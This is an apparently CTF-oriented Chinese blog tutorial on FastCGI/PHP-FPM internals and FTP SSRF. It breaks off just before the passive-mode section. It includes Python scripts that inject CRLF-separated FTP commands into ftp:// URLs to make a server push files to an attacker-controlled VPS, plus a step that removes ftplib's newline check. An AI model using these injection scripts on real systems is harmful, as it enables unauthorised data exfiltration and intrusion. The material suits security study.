<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>FTP被动模式/PHP-FPM攻击利用总结 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="FTP被动模式/PHP-FPM攻击利用总结 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://example.com/2023/05/16/FTP%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F_PHP-FPM%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-05-16T14:30:32.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>May</span>
            <span>16,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">FTP被动模式/PHP-FPM攻击利用总结</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <p>参考文章：</p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>感觉都是被大牛们玩腻了的东西，但可惜我学的晚，来补补。FTP这块之前一直搁着</p>
<h1 id="一、认识PHP-FPM和Nginx（FastCGI）"><a href="#一、认识PHP-FPM和Nginx（FastCGI）" class="headerlink" title="一、认识PHP-FPM和Nginx（FastCGI）"></a>一、认识PHP-FPM和Nginx（FastCGI）</h1><h2 id="（1）基本认识"><a href="#（1）基本认识" class="headerlink" title="（1）基本认识"></a>（1）基本认识</h2><p>PHP-FPM（FastCGI Process Manager）是一种为 PHP 解释器提供进程管理和处理能力的工具。它是 PHP FastCGI 协议的一个实现，通过将 PHP 进程管理和请求处理分离，提供了更高的性能和可扩展性。<br>那啥是FastCGI呢？</p>
<blockquote>
<p>FastCGI（Fast Common Gateway Interface）是一种通信协议，用于在 Web 服务器和应用程序之间进行交互。它是对传统 CGI（Common Gateway Interface）协议的改进和扩展，旨在提高性能和可扩展性。<br>传统的 CGI 协议每次处理请求时都会创建一个新的进程或线程来执行脚本，并在处理完请求后终止进程或线程，这样会导致频繁的进程创建和销毁开销，影响性能。而 FastCGI 协议通过引入进程池的概念和持久连接，允许服务器与应用程序保持长时间的连接，重复使用已创建的进程或线程，从而减少了进程创建和销毁的开销。</p>
</blockquote>
<p>FastCGI 协议的工作方式如下：</p>
<ol>
<li>Web 服务器与 FastCGI 进程管理器（如 PHP-FPM）建立持久连接。</li>
<li>当有请求到达时，Web 服务器将请求信息传递给 FastCGI 进程管理器。</li>
<li>FastCGI 进程管理器根据配置选择一个空闲的进程或线程来处理请求。</li>
<li>选中的进程或线程使用 FastCGI 协议接收请求，并执行相应的脚本或应用程序。</li>
<li>处理完请求后，进程或线程将响应发送回 FastCGI 进程管理器。</li>
<li>FastCGI 进程管理器将响应返回给 Web 服务器，并保持连接以供后续请求重用。</li>
</ol>
<p>FastCGI 协议的优点在于它能够重用进程或线程，减少了频繁创建和销毁的开销，提高了服务器的性能和并发处理能力。它还支持并发处理多个请求，可以在同一时间处理多个请求，提高了系统的吞吐量。FastCGI 协议被广泛用于各种 Web 应用程序和服务器环境中，如 PHP、Python、Ruby 等。<br>说的通俗一点，当用户在浏览器中访问一个网页时，服务器需要处理用户的请求并返回相应的内容。传统的 CGI 协议在每次请求时都需要创建一个新的处理进程，处理完后再销毁进程，这样会导致性能低下。<br>FastCGI 协议解决了这个问题。它引入了一个进程池的概念，服务器在启动时创建一组进程或线程，并保持它们一直运行。当用户发送请求时，服务器选择一个空闲的进程或线程来处理请求，而不是每次都创建一个新的进程。<br>然后悄咪咪的偷一张图<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683879301086-b7956589-4140-4cd0-93ce-4c3398c79ddf.png#averageHue=%23f8f8f7&clientId=u0e29c352-799a-4&from=paste&id=u3f4044fc&originHeight=619&originWidth=670&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=22526&status=done&style=none&taskId=u6c1ed239-a506-43d1-aa7a-8822e9133d1&title=" alt="image.png"></p>
<h2 id="（2）TCP-x2F-Unix通信"><a href="#（2）TCP-x2F-Unix通信" class="headerlink" title="（2）TCP&#x2F;Unix通信"></a>（2）TCP&#x2F;Unix通信</h2><p>TCP：<br>TCP模式即是php-fpm进程会监听本机上的一个端口(默认9000)，然后nginx会把客户端数据通过fastcgi协议传给9000端口，php-fpm拿到数据后会调用cgi进程解析。<br>它允许通过网络进程之间的通信，也可以通过loopback进行本地进程之间通信。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.php(/|$)</span><br><span class="line">&#123;</span><br><span class="line">try_files $uri =404;</span><br><span class="line">fastcgi_pass 127.0.0.1:9000; // 修改这里，指定fastcgi在127.0.0.1的9000端口</span><br><span class="line">fastcgi_index index.php;</span><br><span class="line">include fastcgi.conf;</span><br><span class="line">include pathinfo.conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Unix：<br>unix socket其实严格意义上应该叫unix domain socket，它是unix系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为socket的唯一标识（描述符），需要通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了。 具体原理这里就不讲了，但是此通信方式的性能会优于TCP<br>它允许在本地运行的进程之间进行通信。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.php(/|$)</span><br><span class="line">&#123;</span><br><span class="line">        try_files $uri =404;</span><br><span class="line">        fastcgi_pass unix:/tmp/php-cgi-74.sock;</span><br><span class="line">        fastcgi_index index.php;</span><br><span class="line">        include fastcgi.conf;</span><br><span class="line">        include pathinfo.conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="二、FastCGI协议分析"><a href="#二、FastCGI协议分析" class="headerlink" title="二、FastCGI协议分析"></a>二、FastCGI协议分析</h1><p>和HTTP协议一样，FASTCGI也有对应的协议，并且也有请求头和请求体之分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  /* Header */</span><br><span class="line">  unsigned char version; // 版本</span><br><span class="line">  unsigned char type; // 本次record的类型</span><br><span class="line">  unsigned char requestIdB1; // 本次record对应的请求id</span><br><span class="line">  unsigned char requestIdB0;</span><br><span class="line">  unsigned char contentLengthB1; // body体的大小</span><br><span class="line">  unsigned char contentLengthB0;</span><br><span class="line">  unsigned char paddingLength; // 额外块大小</span><br><span class="line">  unsigned char reserved; </span><br><span class="line">  /* Body */</span><br><span class="line">  unsigned char contentData[contentLength];</span><br><span class="line">  unsigned char paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure>
<p>头由八个char type组成，语言端解析了fastcgi头以后，拿到contentLength，然后再在TCP流里读取大小等于contentLength的数据，这就是body体。</p>
<h2 id="（1）Type"><a href="#（1）Type" class="headerlink" title="（1）Type"></a>（1）Type</h2><p>上述type类型并未说明是什么，偷了一张图。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683881562449-3aa59a1e-8f4c-4b2c-80ce-2e71c94a87ff.png#averageHue=%23f6f5f3&clientId=u5f2217c7-0976-4&from=paste&id=uc4a38e64&originHeight=374&originWidth=791&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=38137&status=done&style=none&taskId=u7d1ac7c1-9811-4977-81aa-bbf582aa15c&title=" alt="image.png"><br>感觉和TCP的握手包有点像（本来就是TCP<br>那么我们可以理清楚顺序了，首先是问候报文就是1，后续发送4、5、6、7进行交流，结束的时候发送2、3表示终止对话。<br>并且当后端语言解析到type为4的类型时，就会把这个record的body按照对应的结构解析为对应的键值对，这个叫做环境变量。如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair11;</span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair14;</span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair41;</span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair44;</span><br></pre></td></tr></table></figure>
<p>这里有四个结构，有如下规则</p>
<ol>
<li>key、value均小于128字节，用 FCGI_NameValuePair11</li>
<li>key大于128字节，value小于128字节，用 FCGI_NameValuePair41</li>
<li>key小于128字节，value大于128字节，用 FCGI_NameValuePair14</li>
<li>key、value均大于128字节，用 FCGI_NameValuePair44</li>
</ol>
<h1 id="三、PHP-FPM解析"><a href="#三、PHP-FPM解析" class="headerlink" title="三、PHP-FPM解析"></a>三、PHP-FPM解析</h1><p>大家都知道<code>$_SERVER</code>这个变量<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683881895228-b3b14f8b-8049-43d4-97d6-23eccbe28b35.png#averageHue=%23c59760&clientId=u5f2217c7-0976-4&from=paste&height=737&id=u2e88a4ee&originHeight=921&originWidth=1495&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=101673&status=done&style=none&taskId=u8a349be7-4f92-42aa-b694-d776a7cb4f5&title=&width=1196" alt="image.png"><br>用户访问<a target="_blank" rel="noopener" href="http://127.0.0.1/index.php?a=1&amp;b=2%EF%BC%8C%E5%A6%82%E6%9E%9Cweb%E7%9B%AE%E5%BD%95%E6%98%AF/var/www/html%EF%BC%8C%E9%82%A3%E4%B9%88Nginx%E4%BC%9A%E5%B0%86%E8%BF%99%E4%B8%AA%E8%AF%B7%E6%B1%82%E5%8F%98%E6%88%90%E5%A6%82%E4%B8%8Bkey-value%E5%AF%B9%EF%BC%9A">http://127.0.0.1/index.php?a=1&amp;b=2，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对：</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="四、FTP主-x2F-被动模式SSRF"><a href="#四、FTP主-x2F-被动模式SSRF" class="headerlink" title="四、FTP主&#x2F;被动模式SSRF"></a>四、FTP主&#x2F;被动模式SSRF</h1><h2 id="（1）主动模式攻击server"><a href="#（1）主动模式攻击server" class="headerlink" title="（1）主动模式攻击server"></a>（1）主动模式攻击server</h2><p>这里ftp服务器我们使用如下脚本去搭建</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import logging</span></span><br><span class="line"><span class="keyword">from</span> pyftpdlib.authorizers <span class="keyword">import</span> DummyAuthorizer</span><br><span class="line"><span class="keyword">from</span> pyftpdlib.handlers <span class="keyword">import</span> FTPHandler</span><br><span class="line"><span class="keyword">from</span> pyftpdlib.servers <span class="keyword">import</span> FTPServer</span><br><span class="line">authorizer = DummyAuthorizer()</span><br><span class="line">authorizer.add_user(<span class="string">&quot;fan&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;.&quot;</span>,perm=<span class="string">&quot;elrafmwMT&quot;</span>)</span><br><span class="line">authorizer.add_anonymous(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">handler = FTPHandler</span><br><span class="line">handler.permit_foreign_addresses = <span class="literal">True</span> <span class="comment">#&lt;-- 此句很重要，原因后说</span></span><br><span class="line">handler.passive_ports = <span class="built_in">range</span>(<span class="number">2000</span>, <span class="number">2030</span>)</span><br><span class="line">handler.authorizer = authorizer</span><br><span class="line"><span class="comment"># logging.basicConfig(level=logging.DEBUG) &lt;-- 在测试时加入此句方便dubug</span></span><br><span class="line">server = FTPServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8877</span>), handler)</span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure>
<p>我们使用python里的urlopen去通过ftp协议获取ftp-server.py的内容：<br><code>urlopen(&quot;ftp://fan:root@127.0.0.1:8877/ftp-server.py&quot;).read()</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683885676227-eb22386d-9622-4e0e-9c16-f35492cc57ca.png#averageHue=%234e5d28&clientId=u622f4da7-80a4-4&from=paste&height=674&id=u35114ab9&originHeight=843&originWidth=1499&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1898752&status=done&style=none&taskId=u511c7a01-3267-4831-983b-3e91334e49c&title=&width=1199.2" alt="image.png"><br>结果如上，可以清楚的看到ftp服务器的认证报文以及右侧的回显结果。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[I 2023-05-12 22:05:04] 127.0.0.1:44604-[] FTP session opened (connect)</span><br><span class="line">[I 2023-05-12 22:05:04] 127.0.0.1:44604-[fan] USER &#x27;fan&#x27; logged in.</span><br><span class="line">[I 2023-05-12 22:05:04] 127.0.0.1:44604-[fan] CWD /opt 250</span><br><span class="line">[I 2023-05-12 22:05:04] 127.0.0.1:44604-[fan] RETR /opt/ftp-server.py completed=1 bytes=591 seconds=0.0</span><br><span class="line">[I 2023-05-12 22:05:04] 127.0.0.1:44604-[fan] FTP session closed (disconnect).</span><br></pre></td></tr></table></figure>
<p>从这一段可以知道基本的认证流程</p>
<ul>
<li>打开session</li>
<li>进行身份认证（检测name和pwd）</li>
<li>获取当前所在目录CWD</li>
<li>RETR表示返回的内容。（我们请求了ftp-server.py)</li>
<li>最后关闭session</li>
</ul>
<p>其中后四步都是client发送给server的。所以很明显可以进行CRLF的注入，这也是SSRF的成因。<br>这边本地复现不了通过python实现CRLF注入，应该是后续在ftplib.py模块加上了一些东西。尝试了3个py版本都会抛出<code>ValueError: an illegal newline character should not be contained</code>异常，说明urlopen里不能包含换行符。失败告终，不过不影响（<br>假如成功是可以出现如下内容的<br><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/32634994/1683905271205-b21b64da-8bd4-49c8-8df7-54e530ab98b8.jpeg#averageHue=%230f0f0f&clientId=u52e5d158-cb25-4&from=paste&id=u4ba2592e&originHeight=389&originWidth=690&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u3688166b-f18e-47ae-b88d-2f9da216692&title="><br><strong>龟速填坑</strong><br>一开始蠢到懒得去看源码，估计是21年后由于ftp的题目泛滥，人家直接给源码抛出了一个exception，因为源码原本长这样：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">putline</span>(<span class="params">self, line</span>):</span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;\r&#x27;</span> <span class="keyword">in</span> line <span class="keyword">or</span> <span class="string">&#x27;\n&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">           <span class="keyword">raise</span> ValueError(<span class="string">&#x27;an illegal newline character should not be contained&#x27;</span>)</span><br><span class="line">       line = line + CRLF</span><br><span class="line">       <span class="keyword">if</span> self.debugging &gt; <span class="number">1</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&#x27;*put*&#x27;</span>, self.sanitize(line))</span><br><span class="line">       self.sock.sendall(line.encode(self.encoding))</span><br></pre></td></tr></table></figure>
<p>你可以看到exception底下就是line+CRLF，但是他在上面加了一个补丁。操你妈<br>所以我们假如想本地复现，需要把这个异常给他去掉。<br>服务器还是上述代码的，这次exp如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="comment"># url=f&#x27;&#x27;&#x27;ftp://fan:root\r\nTYPE I\r\nCWD .\r\nPORT 172,28,18,131,30,97\r\nRETR ftp-server.py\r\n@172.28.18.131:8877/ftp-server.py&#x27;&#x27;&#x27;</span></span><br><span class="line">url=<span class="string">&#x27;ftp://fan:root\r\nTYPE I\r\nCWD .\r\nPORT 172,28,18,131,30,97\r\nRETR ftp-server.py\r\n@172.28.18.131:8877/ftp-server.py&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info=urllib.request.urlopen(url).read()</span><br><span class="line">    <span class="built_in">print</span>(info)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure>
<p>PORT 后两位数字是通过<code>port &#123;ip&#125;,&#123;port // 256&#125;,&#123;port - port // 256 * 256&#125;</code>计算得来，可以参考这个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_port_cmd</span>(<span class="params">host</span>):</span><br><span class="line">    ip, port = host.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    ip = <span class="string">&#x27;,&#x27;</span>.join(ip.split(<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">    port = <span class="built_in">int</span>(port)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;port <span class="subst">&#123;ip&#125;</span>,<span class="subst">&#123;port // <span class="number">256</span>&#125;</span>,<span class="subst">&#123;port - port // <span class="number">256</span> * <span class="number">256</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 向本地的FTP发送消息</span></span><br><span class="line">    target = <span class="string">&#x27;172.28.18.131:8877&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># FTP的消息</span></span><br><span class="line">    commands = [<span class="string">&#x27;type i&#x27;</span>, get_port_cmd(host=<span class="string">&#x27;172.28.18.131:7777&#x27;</span>), <span class="string">&#x27;retr slug01sh&#x27;</span>]</span><br><span class="line">    commands_str = <span class="string">&#x27;\r\n&#x27;</span>.join(commands)</span><br><span class="line">    <span class="built_in">print</span>(commands_str)</span><br><span class="line">    commands_str = urllib.parse.quote(commands_str)</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&#x27;ftp://fan:root@&#x27;</span>+target+<span class="string">&#x27;/\r\n&#x27;</span>+commands_str</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    <span class="comment"># urllib.request.urlopen(url)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行之后我们可以得到如下结果<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683907048008-fb0fbfe9-d1b2-4b94-a640-7e58deca9735.png#averageHue=%2334592b&clientId=u52e5d158-cb25-4&from=paste&height=708&id=u56d520a4&originHeight=885&originWidth=1670&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2167358&status=done&style=none&taskId=u0afba5f7-7ef5-4e50-9a7e-ebfe43d7884&title=&width=1336" alt="image.png"><br>我们可以将他的数据发送到vps上，vps只需起一个监听即可。</p>
<h2 id="（2）被动模式攻击clinet"><a href="#（2）被动模式攻击clinet" class="headerlink" title="（2）被动模式攻击clinet"></a>（2）被动模式攻击clinet</h2><p>被动模式经常出现在一些CTF题里面，这也是本文的重点。上文是让服务端重定向到我们的vps，这次我们需要让请求服务端的客户端重定向到客户端的内网，去攻击客户端的内网应用。这里就简单让client发送一段数据，如test到内网的某个端口上<br>实现这一点我们首先需要进行一些环境搭建</p>
<ul>
<li>php</li>
<li>evil-ftp</li>
</ul>
<p>我们准备的php代码就一句话</p>
